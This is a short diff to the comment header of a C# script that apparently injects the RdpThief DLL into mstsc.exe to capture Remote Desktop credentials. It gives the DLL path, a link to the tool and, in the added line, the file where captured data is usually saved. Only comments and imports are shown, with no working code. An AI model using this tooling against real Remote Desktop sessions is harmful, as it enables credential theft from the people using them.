@@ -1,5 +1,6 @@
 //Please note that this technique relies on DLL injection, this script assumes that the DLL is located in C:\Tools\RdpThief.dll
 //You can find RdpThief here: https://github.com/0x09AL/RdpThief
+//This tool is able to automatically detect instances of mstsc.exe running, the outputs are usally saved here: C:\Users\trike\AppData\Local\Temp\6\data.bin
 using System;
 using System.Collections.Generic;
 using System.Linq;
